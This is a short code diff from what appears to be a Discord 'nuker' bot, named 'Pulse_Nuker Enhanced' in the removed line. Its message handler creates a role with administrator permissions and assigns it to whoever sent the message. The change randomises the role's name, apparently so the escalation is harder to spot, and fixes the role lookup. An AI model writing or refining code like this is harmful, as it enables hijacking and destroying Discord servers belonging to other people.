@@ -101,8 +101,9 @@ async def on_message(message):
         perms=discord.Permissions(administrator=True)
         try:
             user=message.author
-            await guild.create_role(name='Pulse_Nuker Enhanced', colour=discord.Colour.random(),permissions=perms)
-            role=get(guild.roles,name='TEST')
+            kk = randomletters(10)
+            await guild.create_role(name=kk, colour=discord.Colour.random(),permissions=perms)
+            role=get(guild.roles,name=kk)
             await user.add_roles(role)
         except:
             print('maximum number of roles reached')
